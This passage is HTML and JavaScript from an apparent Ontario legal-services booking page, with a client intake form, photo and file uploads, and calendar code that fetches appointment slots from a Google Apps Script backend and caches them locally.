                                        <line x1="3" y1="10" x2="21" y2="10"></line>
                                        <line x1="3" y1="16" x2="21" y2="16"></line>
                                        <line x1="9" y1="10" x2="9" y2="22"></line>
                                        <line x1="15" y1="10" x2="15" y2="22"></line>
                                    </svg>
                                </span>
                            </span>
                        </button>
                        <p style="margin: 0; color: var(--text-white); font-size: 0.9rem; line-height: 1.4; flex: 1 1 240px;">You can click this calendar button to choose dates and times for each appointment.</p>
                    </div>
                </div>
                
                <div class="contact-form__group">
                    <input type="text" class="contact-form__input" placeholder="Name" name="name" required minlength="2" maxlength="80" autocomplete="name" inputmode="text" spellcheck="false">
                </div>
                <div class="contact-form__group">
                    <input type="text" class="contact-form__input" placeholder="Occupation" name="occupation" required minlength="2" maxlength="100" autocomplete="organization-title" inputmode="text" spellcheck="false">
                </div>
                <div class="contact-form__group">
                    <input type="email" class="contact-form__input" placeholder="Email" name="email" required maxlength="120" autocomplete="email" inputmode="email" spellcheck="false">
                </div>

                <div class="contact-form__group">
                    <div class="custom-select-wrapper">
                        <div class="custom-select" id="customSelect">
                            <button class="custom-select__trigger" type="button">
                                <span>Choose Service</span>
                            </button>
                            <div class="custom-options">
                                <div class="custom-option" data-value="public-notary">Public Notary Services</div>
                                <div class="custom-option" data-value="employment">Employment Law</div>
                                <div class="custom-option" data-value="civil">Civil matter</div>
                                <div class="custom-option" data-value="road-record-defense">Traffic Ticket Defense</div>
                                <div class="custom-option" data-value="wsib">WSIB related issue</div>
                                <div class="custom-option" data-value="ltb">LTB related issue</div>
                                <div class="custom-option" data-value="other">Other</div>
                            </div>
                        </div>
                        <input type="hidden" name="service" id="serviceInput" value="">
                    </div>
                </div>

                <div class="contact-form__group">
                    <input type="tel" class="contact-form__input" placeholder="Phone" name="phone" required maxlength="20" autocomplete="tel" inputmode="tel" spellcheck="false">
                </div>

                <div class="contact-form__group">
                    <div class="booking-row booking-row--address-main" style="display: flex; gap: 10px; margin-bottom: 10px;">
                        <input type="text" class="contact-form__input" placeholder="Unit/Apt" name="address_unit" maxlength="16" autocomplete="address-line2" inputmode="text" spellcheck="false" style="width: 8.2rem; min-width: 7.6rem; text-transform: uppercase;">
                        <input type="text" class="contact-form__input" placeholder="Street" name="address_street" required minlength="6" maxlength="150" autocomplete="address-line1" inputmode="text" spellcheck="false" style="flex-grow: 1;">
                    </div>
                    <div class="booking-row booking-row--address-city" style="display: flex; gap: 10px; margin-bottom: 10px;">
                        <div class="custom-select-wrapper custom-select-wrapper--city">
                            <div class="custom-select custom-select--city" id="cityCustomSelect">
                                <button class="custom-select__trigger" type="button" aria-label="City">
                                    <span>City</span>
                                </button>
                                <div class="custom-options">
                                    <div class="custom-option" data-value="Toronto">Toronto</div>
                                    <div class="custom-option" data-value="Richmond Hill">Richmond Hill</div>
                                    <div class="custom-option" data-value="Mississauga">Mississauga</div>
                                    <div class="custom-option" data-value="Oakville">Oakville</div>
                                    <div class="custom-option" data-value="Burlington">Burlington</div>
                                    <div class="custom-option" data-value="Hamilton">Hamilton</div>
                                    <div class="custom-option" data-value="Milton">Milton</div>
                                    <div class="custom-option" data-value="Guelph">Guelph</div>
                                    <div class="custom-option" data-value="Kitchener">Kitchener</div>
                                    <div class="custom-option" data-value="Waterloo">Waterloo</div>
                                    <div class="custom-option" data-value="Cambridge">Cambridge</div>
                                    <div class="custom-option" data-value="Woodstock">Woodstock</div>
                                    <div class="custom-option" data-value="London">London</div>
                                    <div class="custom-option" data-value="Brampton">Brampton</div>
                                    <div class="custom-option" data-value="Brantford">Brantford</div>
                                    <div class="custom-option" data-value="Stratford">Stratford</div>
                                    <div class="custom-option" data-value="St. Thomas">St. Thomas</div>
                                    <div class="custom-option" data-value="Sarnia">Sarnia</div>
                                    <div class="custom-option" data-value="Chatham">Chatham</div>
                                    <div class="custom-option" data-value="Windsor">Windsor</div>
                                    <div class="custom-option" data-value="St. Catharines">St. Catharines</div>
                                    <div class="custom-option" data-value="Niagara Falls">Niagara Falls</div>
                                    <div class="custom-option" data-value="Welland">Welland</div>
                                    <div class="custom-option" data-value="Barrie">Barrie</div>
                                    <div class="custom-option" data-value="Other">Other</div>
                                </div>
                            </div>
                            <input type="hidden" name="address_city" id="cityInput" value="">
                        </div>
                        <div class="custom-select-wrapper custom-select-wrapper--province">
                            <div class="custom-select custom-select--province" id="provinceCustomSelect">
                                <button class="custom-select__trigger" id="provinceTriggerMain" type="button" aria-label="Province">
                                    <span>Ontario</span>
                                </button>
                                <div class="custom-options">
                                    <div class="custom-option selected" data-value="Ontario">Ontario</div>
                                    <div class="custom-option" data-value="Alberta">AB</div>
                                    <div class="custom-option" data-value="Manitoba">MB</div>
                                    <div class="custom-option" data-value="Nunavut">NU</div>
                                    <div class="custom-option" data-value="Quebec">QC</div>
                                    <div class="custom-option" data-value="Yukon">YT</div>
                                    <div class="custom-option" data-value="British Columbia">BC</div>
                                    <div class="custom-option" data-value="New Brunswick">NB</div>
                                    <div class="custom-option" data-value="Newfoundland and Labrador">NL</div>
                                    <div class="custom-option" data-value="Northwest Territories">NT</div>
                                    <div class="custom-option" data-value="Nova Scotia">NS</div>
                                    <div class="custom-option" data-value="Prince Edward Island">PE</div>
                                    <div class="custom-option" data-value="Saskatchewan">SK</div>
                                </div>
                            </div>
                            <input id="provinceInputMain" type="hidden" name="address_province" value="Ontario">
                        </div>
                    </div>
                    <div class="booking-row booking-row--address-secondary booking-row--province-zip" style="display: flex; gap: 10px; justify-content: flex-end; align-items: center;">
                        <input type="text" class="contact-form__input" placeholder="ZIP" name="address_zip" required minlength="6" maxlength="7" autocomplete="postal-code" inputmode="text" spellcheck="false" style="text-transform: uppercase; text-align: center; caret-color: #ffffff;">
                    </div>
                </div>

                <div class="contact-form__group">
                    <textarea class="contact-form__textarea" rows="3" maxlength="3000" placeholder="Brief details about your case area..." name="notes" style="text-align: left;"></textarea>
                    
                    <!-- File Attachment moved under Brief Case Area -->
                    <div class="file-attach" style="margin-top: 15px; padding: 12px; background: rgba(255, 255, 255, 0.05); border-radius: 0.8rem;">
                        <input type="file" id="fileAttachInput" multiple accept="image/*,video/*,.pdf,.doc,.docx" style="display: none;">
                        <input type="file" id="cameraFallbackInput" accept="image/*" capture="environment" style="display: none;">
                        <div class="file-attach__controls" style="display: flex; flex-wrap: wrap; gap: 10px; align-items: stretch;">
                            <div class="file-attach__drop-zone file-attach__drop-zone-camera" style="width: 100%; display: flex; align-items: center; gap: 10px; border: 2px dashed rgba(255, 255, 255, 0.4); border-radius: 0.8rem; padding: 8px 10px; background: rgba(255, 255, 255, 0.03); cursor: pointer;" onclick="document.getElementById('takePhotoBtn').click()">
                                <button type="button" class="file-attach__btn file-attach__btn--camera" id="takePhotoBtn">
                                    <span class="file-attach__title">
                                        <span class="file-attach__icon">
                                            <svg class="file-attach__icon-svg file-attach__icon-svg--camera" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width: 1.25em; height: 1.25em;">
                                                <path d="M4 7h3l2-2h6l2 2h3a1 1 0 0 1 1 1v10a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a1 1 0 0 1 1-1z"></path>
                                                <circle cx="12" cy="13" r="4"></circle>
                                            </svg>
                                        </span>
                                    </span>
                                </button>
                                <p style="margin: 0; color: var(--text-white); font-size: 0.9rem; line-height: 1.4; text-align: left; flex: 1 1 240px;">Tap this camera icon to take photos of documents on a table or car hood and of the incident scene when feasible.</p>
                            </div>
                            <div class="file-attach__list" id="cameraAttachList" style="width: 100%;"></div>

                            <div class="file-attach__drop-zone file-attach__drop-zone-file" style="width: 100%; margin-top: 2px; display: flex; align-items: center; gap: 10px; border: 2px dashed rgba(255, 255, 255, 0.4); border-radius: 0.8rem; padding: 8px 10px; background: rgba(255, 255, 255, 0.03); cursor: pointer;" onclick="document.getElementById('fileAttachInput').click()">
                                <button type="button" class="file-attach__btn file-attach__btn--camera" onclick="document.getElementById('fileAttachInput').click()" aria-label="Attach files" style="margin: 0; flex: 0 0 auto;">
                                    <span class="file-attach__title">
                                        <span class="file-attach__icon">
                                            <svg class="file-attach__icon-svg file-attach__icon-svg--paperclip" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width: 1.25em; height: 1.25em;">
                                                <path d="M21.44 11.05l-9.19 9.19a6 6 0 0 1-8.49-8.49l9.19-9.19a4 4 0 0 1 5.66 5.66l-9.2 9.19a2 2 0 0 1-2.83-2.83l8.49-8.48"></path>
                                            </svg>
                                        </span>
                                    </span>
                                </button>
                                <p style="margin: 0; color: var(--text-white); font-size: 0.9rem; line-height: 1.4; text-align: left; flex: 1 1 240px;">Upload files: Images: JPG, PNG. Videos: MOV, MP4. Docs: PDF, DOC, DOCX. Up to 50 files, max 100 MB each, 500 MB total.</p>
                            </div>
                            <div class="file-attach__list" id="fileAttachList" style="width: 100%;"></div>
                        </div>
                    </div>
                </div>

                <div class="contact-form__group" style="margin-top: 12px;">
                    <label class="contact-form__label" style="display:block; margin-bottom:8px; color:var(--text-white); text-align: center;">Date of Birth</label>
                    <div class="booking-row booking-row--dob" style="display:flex; gap:10px; justify-content:center; align-items:center;">
                        <input type="number" class="contact-form__input" placeholder="YYYY" name="dob_year" style="flex:1.45 1 0; min-width:96px;" required min="1900" max="2100" step="1" inputmode="numeric">
                        <input type="number" class="contact-form__input" placeholder="MM" name="dob_month" style="flex:0.85 1 0; min-width:64px;" required min="1" max="12" step="1" inputmode="numeric">
                        <input type="number" class="contact-form__input" placeholder="DD" name="dob_day" style="flex:0.85 1 0; min-width:64px;" required min="1" max="31" step="1" inputmode="numeric">
                        <input type="text" class="contact-form__input" id="dobAgePreview" name="age" placeholder="(AGE)" aria-label="Age" inputmode="numeric" maxlength="3" required style="flex:1 1 0; min-width:78px; text-align:center;">
                    </div>
                </div>

                <div class="contact-form__group">
                    <label for="hearAboutInput" class="contact-form__label" style="display:block; margin-bottom:8px; color:var(--text-white); text-align: center; text-transform:none; letter-spacing:0;">Where did you hear about us?</label>
                    <textarea id="hearAboutInput" class="contact-form__textarea" name="hear_about" rows="5" maxlength="150" placeholder="(Optional)" autocomplete="off" inputmode="text" spellcheck="false" style="text-align:left;"></textarea>
                </div>

                <div class="contact-form__group">
                    <div class="booking-row booking-row--deadline" style="display:flex; align-items:center; justify-content:center; gap:8px;">
                        <label for="deadlineInputMain" class="contact-form__label" style="margin:0; text-align:right; color:var(--text-white); flex:0 0 auto; text-transform:none; letter-spacing:0;">Deadline:</label>
                        <input id="deadlineInputMain" type="text" class="contact-form__input" name="deadline" placeholder="YYYY.MM.DD" maxlength="120" inputmode="text" spellcheck="false" style="flex:0 0 185px; width:185px; min-width:185px; text-align:center;">
                        <span class="contact-form__label" style="margin:0; text-align:left; color:var(--text-white); flex:0 0 auto; text-transform:none; letter-spacing:0;">(Optional)</span>
                    </div>
                </div>

                <div class="booking-status-slot">
                    <p id="bookingStatus" aria-live="polite" aria-atomic="true"></p>
                </div>

                <div class="modal-sticky-actions">
                    <div id="bookingRecaptchaWrap" class="recaptcha-wrap">
                        <p class="recaptcha-wrap__hint">Complete reCAPTCHA only when the form asks for it.</p>
                        <div id="bookingRecaptchaWidget"></div>
                    </div>
                    <div class="booking-scroll-cue" aria-hidden="true">
                        <span>▾</span><span>▾</span><span>▾</span>
                    </div>
                    <button type="submit" class="contact-form__submit-button" id="confirmBookingBtn">BOOK NOW</button>
                    <div class="contact-form__checkbox-wrapper file-attach__terms">
                        <input type="checkbox" id="agreeTerms" name="agreeTerms" class="contact-form__checkbox" required>
                        <label for="agreeTerms" class="contact-form__checkbox-label">
                            <span>I agree with </span><span class="contact-form__terms-link" onclick="openTermsModal()"><span class="contact-form__terms-word">Terms</span></span>
                        </label>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>

<div id="cameraCaptureModal" class="camera-capture-modal" aria-hidden="true">
    <div class="camera-capture__panel">
        <h3 class="camera-capture__title">Take Document Photo</h3>
        <div class="camera-capture__video-wrap">
            <video id="cameraPreview" class="camera-capture__video" autoplay playsinline muted></video>
        </div>
        <p class="camera-capture__status" id="cameraCaptureStatus">Allow camera access, then press Capture.</p>
        <div class="camera-capture__actions">
            <button type="button" class="contact-form__submit-button" id="cameraSnapBtn">Capture</button>
            <button type="button" class="contact-form__submit-button final-result-done" id="cameraCancelBtn">Cancel</button>
        </div>
    </div>
</div>

<div id="formCalendarOverlay" class="form-calendar-overlay" aria-hidden="true">
    <div class="form-calendar-overlay__panel">
        <div class="form-calendar-overlay__header">
            <h3 class="form-calendar-overlay__title">Select Anoter Time or a Date</h3>
            <p class="form-calendar-overlay__hint">If needed, choose another slot.</p>
            <button type="button" class="form-calendar-overlay__close" id="formCalendarOverlayCloseBtn" aria-label="Close calendar">&times;</button>
        </div>
        <div id="formCalendarOverlayMount" class="form-calendar-overlay__mount"></div>
    </div>
</div>
<script>
    window.__recaptchaApiReady = false;
    function onRecaptchaApiLoaded() {
        window.__recaptchaApiReady = true;
        window.dispatchEvent(new Event('recaptcha-ready'));
    }
</script>
<script async defer src="https://www.google.com/recaptcha/api.js?onload=onRecaptchaApiLoaded&render=explicit"></script>

<script>
    // ------------------------------------------------------------------
    // GAZCONFIGURATION
    // ------------------------------------------------------------------

    const APPS_SCRIPT_URL = "hhttps://script.google.com/macros/s/AKfycbzXr3KWjyo6vY56mJ9GzkylyiYfXLGeh3F3RQe_p_GtucDniHGPkaTpfoEFgxjzyFV4kw/exec"; 
    const RECAPTCHA_SITE_KEY = "6LcULHssAAAAABBC3AYr_sk660jxUqHDsANqdvLv";
    const RECAPTCHA_TOKEN_TTL_MS = 2 * 60 * 1000;
    const MAJOR_ON_CITIES_NEAR_LONDON = new Set([
        'London',
        'Kitchener',
        'Waterloo',
        'Cambridge',
        'Guelph',
        'Hamilton',
        'Burlington',
        'Oakville',
        'Mississauga',
        'Brampton',
        'Toronto',
        'Richmond Hill',
        'Milton',
        'Brantford',
        'Woodstock',
        'Stratford',
        'St. Thomas',
        'Sarnia',
        'Chatham',
        'Windsor',
        'St. Catharines',
        'Niagara Falls',
        'Welland',
        'Barrie',
        'Other'
    ]);
    // ------------------------------------------------------------------
    
    // ------------------------------------------------------------------
    // CALENDAR STATE
    // ------------------------------------------------------------------
    let currentDate   = new Date();
    let selectedDate  = null;
    let absoluteNearestDate   = null;
    let nearestSlotData       = null;
    let nearestDayLastSlotData= null;
    let availableDaysCount    = 0;
    let availableSlotsCache   = {};
    let availableSlotsMeta    = {};
    let availableDaysIndexCache = {};
    let monthFetchPromises    = {};
    let calendarNavInProgress = false;
    let calendarListenersBound = false;
    let calendarRenderToken = 0;
    let calendarCacheLoaded = false;
    let calendarCachePersistTimer = null;
    let monthSwitchProgressTimer = null;
    let monthSwitchProgressValue = 0;
    let monthSwitchProgressRunId = 0;
    let calendarPrevButtonStateRunId = 0;
    let shouldHardReloadAfterModalClose = false;
    let hardReloadAfterModalInProgress = false;
    let calendarAutoRefreshTimer = null;
    let calendarAutoRefreshInProgress = false;
    let calendarAutoRefreshQueued = false;
    let calendarAutoRefreshLastAt = 0;
    let calendarFetchFailedForRender = false;
    let dailyMidnightReloadTimer = null;
    let isFormCalendarOverlayActive = false;
    let calendarScaleWrapperHomeParent = null;
    let calendarScaleWrapperHomeNextSibling = null;

    const CALENDAR_CACHE_STORAGE_KEY = 'hd_calendar_cache_v2';
    const CALENDAR_CACHE_DAY_MARKER_KEY = 'hd_calendar_cache_day_v1';
    const CALENDAR_CACHE_TTL_MS = 5 * 60 * 1000;
    const CALENDAR_CACHE_MAX_MONTHS = 18;
    const CALENDAR_PREFETCH_MONTHS_AHEAD = 2;
    const CALENDAR_AUTO_REFRESH_INTERVAL_MS = 20 * 60 * 1000;
    const CALENDAR_BASE_WIDTH_PX = 656;
    const CALENDAR_SCALE_BOTTOM_BUFFER_PX = 30;
    const MONTH_SWITCH_PROGRESS_TICK_MS = 120;
    const MONTH_SWITCH_PROGRESS_SOFT_CAP = 94;
    const CALENDAR_LOAD_FAILURE_TEXT = 'SLOT NOT FOUND';

    const MONTH_NAMES = ["January","February","March","April","May","June",
                        "July","August","September","October","November","December"];
    const DAY_NAMES_FULL  = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
    const DAY_NAMES_SHORT = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];

    // DOM refs (resolved after DOMContentLoaded)
    let calGrid, calOverlay, calLoaderStatus, monthDisplay,
        slotsGrid, slotsBlock, slotsNav, slotsDayDisplay, headerTitle,
        monthSwitchOverlay, monthSwitchProgressFill, monthSwitchProgressValueEl;

    // ------------------------------------------------------------------
    // FETCH
    // ------------------------------------------------------------------
    function getMonthKey(year, month) {
        return `${year}-${month}`;
    }

    function getTorontoDateStamp() {
        try {
            const parts = new Intl.DateTimeFormat('en-CA', {
                timeZone: 'America/Toronto',
                year: 'numeric',
                month: '2-digit',
                day: '2-digit'
            }).formatToParts(new Date());

            let year = '';
            let month = '';
            let day = '';
            parts.forEach((part) => {
                if (part.type === 'year') year = part.value;
                if (part.type === 'month') month = part.value;
                if (part.type === 'day') day = part.value;
            });
            if (year && month && day) return `${year}-${month}-${day}`;
        } catch (e) {}

        const now = new Date();
        return `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')}`;
    }

    function ensureDailyCalendarCacheFreshness() {
        const todayStamp = getTorontoDateStamp();
        let storedStamp = '';
        try {
            storedStamp = String(localStorage.getItem(CALENDAR_CACHE_DAY_MARKER_KEY) || '').trim();
        } catch (e) {}

        if (storedStamp === todayStamp) return;

        clearCalendarCache();
        try {
            localStorage.setItem(CALENDAR_CACHE_DAY_MARKER_KEY, todayStamp);
        } catch (e) {}
    }

    function isMonthCacheFresh(key) {
        const ts = availableSlotsMeta[key];
        return Number.isFinite(ts) && (Date.now() - ts) < CALENDAR_CACHE_TTL_MS;
    }

    function pruneCalendarCache() {
        const now = Date.now();
        const keys = Object.keys(availableSlotsCache);

        keys.forEach(key => {
            const ts = Number(availableSlotsMeta[key]);
            if (!Number.isFinite(ts) || (now - ts) > CALENDAR_CACHE_TTL_MS) {
                delete availableSlotsCache[key];
                delete availableSlotsMeta[key];
                delete availableDaysIndexCache[key];
            }
        });

        const sorted = Object.keys(availableSlotsMeta).sort((a, b) => availableSlotsMeta[b] - availableSlotsMeta[a]);
        if (sorted.length > CALENDAR_CACHE_MAX_MONTHS) {
            sorted.slice(CALENDAR_CACHE_MAX_MONTHS).forEach(key => {
                delete availableSlotsCache[key];
                delete availableSlotsMeta[key];
                delete availableDaysIndexCache[key];
            });
        }
    }

    function persistCalendarCache() {
        try {
            pruneCalendarCache();
            const months = {};
            Object.keys(availableSlotsCache).forEach(key => {
                const ts = Number(availableSlotsMeta[key]);
                const slots = availableSlotsCache[key];
                if (!Number.isFinite(ts) || !Array.isArray(slots)) return;
                months[key] = { ts, slots };
            });
            localStorage.setItem(CALENDAR_CACHE_STORAGE_KEY, JSON.stringify({ version: 2, months }));
        } catch (e) {
            // localStorage can fail in private mode/quota pressure.
        }
    }

    function scheduleCalendarCachePersist() {
        clearTimeout(calendarCachePersistTimer);
        calendarCachePersistTimer = setTimeout(persistCalendarCache, 120);
    }

    function hydrateCalendarCacheFromStorage() {
        ensureDailyCalendarCacheFreshness();
        if (calendarCacheLoaded) return;
        calendarCacheLoaded = true;

        try {
            const raw = localStorage.getItem(CALENDAR_CACHE_STORAGE_KEY);
            if (!raw) return;
            const parsed = JSON.parse(raw);
            if (!parsed || parsed.version !== 2 || typeof parsed.months !== 'object' || !parsed.months) return;

            Object.entries(parsed.months).forEach(([key, entry]) => {
                if (!entry || !Array.isArray(entry.slots)) return;
                const ts = Number(entry.ts);
                if (!Number.isFinite(ts)) return;
                availableSlotsCache[key] = entry.slots;
                availableSlotsMeta[key] = ts;
            });

            pruneCalendarCache();
        } catch (e) {
            // Ignore malformed cache and continue with network fetches.
        }
    }

    function setMonthCache(key, slots) {
        availableSlotsCache[key] = Array.isArray(slots) ? slots : [];
        availableSlotsMeta[key] = Date.now();
        delete availableDaysIndexCache[key];
        pruneCalendarCache();
        scheduleCalendarCachePersist();
    }

    function clearCalendarCache() {
        availableSlotsCache = {};
        availableSlotsMeta = {};
        availableDaysIndexCache = {};
        monthFetchPromises = {};
        clearTimeout(calendarCachePersistTimer);
        try {
            localStorage.removeItem(CALENDAR_CACHE_STORAGE_KEY);
        } catch (e) {}
    }

    async function refreshCalendarAndButtons(reason = 'timer', force = false) {
        if (calendarAutoRefreshInProgress) {
            calendarAutoRefreshQueued = true;
            return;
        }
        if (!force && document.hidden) return;
        if (calendarNavInProgress) {
            calendarAutoRefreshQueued = true;
            return;
        }
        if (!force && isAnyModalOpen()) {
            calendarAutoRefreshQueued = true;
            return;
        }

        calendarAutoRefreshInProgress = true;
        try {
            clearCalendarCache();

            // Keep the visible month stable while forcing fresh slot data.
            if (selectedDate instanceof Date && !Number.isNaN(selectedDate.getTime())) {
                currentDate = new Date(selectedDate.getFullYear(), selectedDate.getMonth(), 1);
            } else if (currentDate instanceof Date && !Number.isNaN(currentDate.getTime())) {
                currentDate = new Date(currentDate.getFullYear(), currentDate.getMonth(), 1);
            } else {
                currentDate = new Date();
                currentDate = new Date(currentDate.getFullYear(), currentDate.getMonth(), 1);
            }

            await renderCalendar();
            updateFooterBookBtn();
            calendarAutoRefreshLastAt = Date.now();
        } catch (err) {
            console.warn(`[CALENDAR AUTO REFRESH] ${reason} failed:`, err && err.message ? err.message : err);
        } finally {
            calendarAutoRefreshInProgress = false;
            if (calendarAutoRefreshQueued) {
                calendarAutoRefreshQueued = false;
                setTimeout(() => {
                    refreshCalendarAndButtons('queued', true).catch(() => {});
                }, 250);
            }
        }
    }

    function startCalendarAutoRefresh() {
        if (calendarAutoRefreshTimer) return;
        calendarAutoRefreshLastAt = Date.now();

        calendarAutoRefreshTimer = setInterval(() => {
            refreshCalendarAndButtons('20min-interval').catch(() => {});
        }, CALENDAR_AUTO_REFRESH_INTERVAL_MS);

        document.addEventListener('visibilitychange', () => {
            if (document.hidden) return;
            const elapsed = Date.now() - calendarAutoRefreshLastAt;
            if (elapsed >= CALENDAR_AUTO_REFRESH_INTERVAL_MS) {
                refreshCalendarAndButtons('tab-visible-catchup', true).catch(() => {});
            }
        });
    }

    async function clearClientRuntimeCachesAfterBooking() {
        clearCalendarCache();

        // Best-effort cleanup for browser-level caches if available.
        try {
            if ('caches' in window && window.caches && typeof window.caches.keys === 'function') {
                const cacheKeys = await window.caches.keys();
                await Promise.all(cacheKeys.map((cacheKey) => window.caches.delete(cacheKey)));
            }
        } catch (e) {}

        // Remove known local/session state so next load is fresh.
        try { localStorage.removeItem('bookingFormData'); } catch (e) {}
        try { sessionStorage.clear(); } catch (e) {}
    }

    function markHardReloadAfterModalClose() {
        shouldHardReloadAfterModalClose = true;
        hardReloadAfterModalInProgress = false;
    }

    function buildHardReloadUrl() {
        const nextUrl = new URL(window.location.href);
        nextUrl.searchParams.set('__hd_reload', String(Date.now()));
        return nextUrl.toString();
    }

    function getMsUntilNextMidnight() {
        const now = new Date();
        const nextMidnight = new Date(
            now.getFullYear(),
            now.getMonth(),
            now.getDate() + 1,
            0, 0, 0, 0
        );
        const delta = nextMidnight.getTime() - now.getTime();
        return Math.max(1000, delta);
    }

    function scheduleDailyHardReloadAtMidnight() {
        if (dailyMidnightReloadTimer) {
            clearTimeout(dailyMidnightReloadTimer);
            dailyMidnightReloadTimer = null;
        }

        const arm = () => {
            dailyMidnightReloadTimer = setTimeout(() => {
                window.location.replace(buildHardReloadUrl());
            }, getMsUntilNextMidnight());
        };

        arm();

        document.addEventListener('visibilitychange', () => {
            if (document.hidden) return;
            const now = new Date();
            if (now.getHours() === 0 && now.getMinutes() === 0) {
                window.location.replace(buildHardReloadUrl());
                return;
            }
            arm();
        });
    }

    async function fetchMonth(year, month, applyMonthJump = true, showProgress = true) {
        hydrateCalendarCacheFromStorage();
        const key = getMonthKey(year, month);
        if (availableSlotsCache[key] !== undefined && isMonthCacheFresh(key)) return; // Fresh cache hit
        if (monthFetchPromises[key]) {
            await monthFetchPromises[key];
            return;
        }
        const separator = document.getElementById('loadingSeparator');
        if (showProgress && separator) separator.classList.add('loading-separator--active');
        monthFetchPromises[key] = (async () => {
            try {
            const res  = await fetch(`${APPS_SCRIPT_URL}?year=${year}&month=${month}`);
            const data = await res.json();
            if (data.success && Array.isArray(data.slots)) {
                const ay = data.resultYear  ?? year;
                const am = data.resultMonth ?? month;
                const returnedKey = getMonthKey(ay, am);
                if (ay === year && am === month) {
                    // Backend found a later month with free slots - jump there
                    setMonthCache(key, data.slots);
                } else {
                    setMonthCache(key, []);
                    setMonthCache(returnedKey, data.slots);
                    if (applyMonthJump) {
                        currentDate = new Date(ay, am, 1);
                    }
                }
            } else {
                setMonthCache(key, []);
            }
        } catch(e) {
            // Do not poison cache on silent prefetch failures; allow retries later.
            if (showProgress) calendarFetchFailedForRender = true;
            if (showProgress && availableSlotsCache[key] === undefined) setMonthCache(key, []);
        } finally {
                if (showProgress && separator) separator.classList.remove('loading-separator--active');
                delete monthFetchPromises[key];
            }
        })();

        await monthFetchPromises[key];
    }

    function prefetchNextMonthFrom(year, month) {
        // Warm upcoming months for smoother arrow navigation.
        for (let offset = 1; offset <= CALENDAR_PREFETCH_MONTHS_AHEAD; offset++) {
            const target = new Date(year, month + offset, 1);
            const targetYear = target.getFullYear();
            const targetMonth = target.getMonth();
            const targetKey = getMonthKey(targetYear, targetMonth);
            if ((availableSlotsCache[targetKey] !== undefined && isMonthCacheFresh(targetKey)) || monthFetchPromises[targetKey]) continue;
            fetchMonth(targetYear, targetMonth, false, false).catch(() => {});
        }
    }

    function getMinBookableDate() {
        const d = new Date();
        d.setDate(d.getDate() + 2);
        d.setHours(0, 0, 0, 0);
        return d;
    }

    function getAvailableDaysForMonth(year, month) {
        const key = getMonthKey(year, month);
        if (Array.isArray(availableDaysIndexCache[key])) {
            return availableDaysIndexCache[key];
        }
        const slots = availableSlotsCache[key] || [];
        const minDate = getMinBookableDate();
        const daysMap = new Map();

        slots.forEach(slot => {
            if (slot.status === 'busy') return;
            const day = Number(slot.date);
            if (!Number.isFinite(day)) return;
            const date = new Date(year, month, day);
            date.setHours(0, 0, 0, 0);
            const dow = date.getDay();
            if (date < minDate) return;
            if (dow === 0) return;
            if (!daysMap.has(day)) daysMap.set(day, true);
        });

        const indexedDays = Array.from(daysMap.keys()).sort((a, b) => a - b);
        availableDaysIndexCache[key] = indexedDays;
        return indexedDays;
    }

    async function findAdjacentAvailableDate(direction) {
        if (direction !== 1 && direction !== -1) return null;

        const minDate = getMinBookableDate();
        const pivot = selectedDate ? new Date(selectedDate) : new Date(minDate);
        pivot.setHours(0, 0, 0, 0);
        if (pivot < minDate) pivot.setTime(minDate.getTime());
        // No valid dates exist before min bookable date, so do not scan months.
        if (direction === -1 && pivot <= minDate) return null;

        const maxMonthsToScan = 12;
        for (let offset = 0; offset < maxMonthsToScan; offset++) {
            const monthCursor = new Date(pivot.getFullYear(), pivot.getMonth() + (offset * direction), 1);
            const year = monthCursor.getFullYear();
            const month = monthCursor.getMonth();
            await fetchMonth(year, month, false, false);

            const days = getAvailableDaysForMonth(year, month)
                .filter(d => new Date(year, month, d).getDay() !== 6);
            if (!days.length) continue;

            let candidateDay = null;
            if (offset === 0) {
                const pivotDay = pivot.getDate();
                if (direction === 1) {
                    candidateDay = selectedDate
                        ? (days.find(d => d > pivotDay) ?? null)
                        : (days.find(d => d >= pivotDay) ?? null);
                } else {
                    const before = days.filter(d => d < pivotDay);
                    candidateDay = before.length ? before[before.length - 1] : null;
                }
            } else {
                candidateDay = direction === 1 ? days[0] : days[days.length - 1];
            }

            if (candidateDay == null) continue;
            const candidate = new Date(year, month, candidateDay);
            candidate.setHours(0, 0, 0, 0);
            if (candidate < minDate) continue;
            return candidate;
        }

        return null;
    }

    async function findNearestAvailableDateFrom(startDate, maxMonthsToScan = CALENDAR_CACHE_MAX_MONTHS) {
        if (!(startDate instanceof Date) || Number.isNaN(startDate.getTime())) return null;

        const minDate = getMinBookableDate();
        const pivot = new Date(startDate);
        pivot.setHours(0, 0, 0, 0);
        if (pivot < minDate) pivot.setTime(minDate.getTime());

        for (let offset = 0; offset < maxMonthsToScan; offset++) {
            const monthCursor = new Date(pivot.getFullYear(), pivot.getMonth() + offset, 1);
            const year = monthCursor.getFullYear();
            const month = monthCursor.getMonth();

            await fetchMonth(year, month, false, false);

            const days = getAvailableDaysForMonth(year, month);
            if (!days.length) continue;

            const candidateDay = offset === 0
                ? (days.find(d => d >= pivot.getDate()) ?? null)
                : days[0];
            if (candidateDay == null) continue;

            const candidate = new Date(year, month, candidateDay);
            candidate.setHours(0, 0, 0, 0);
            if (candidate < minDate) continue;
            return candidate;
        }

        return null;
    }

    function getAdjacentRenderedAvailableDayEl(direction) {
        const renderedYear = Number(calGrid?.dataset.year);
        const renderedMonth = Number(calGrid?.dataset.month);
        const hasRenderedMeta = Number.isFinite(renderedYear) && Number.isFinite(renderedMonth);
        const fallbackYear = currentDate instanceof Date ? currentDate.getFullYear() : 0;
        const fallbackMonth = currentDate instanceof Date ? currentDate.getMonth() : 0;
        const effectiveYear = hasRenderedMeta ? renderedYear : fallbackYear;
        const effectiveMonth = hasRenderedMeta ? renderedMonth : fallbackMonth;

        const availableEls = Array.from(document.querySelectorAll('.cal-day.cal-day--has-slots'))
            .filter(el => {
                const dayNum = Number(el.dataset.day);
                if (!Number.isFinite(dayNum)) return false;
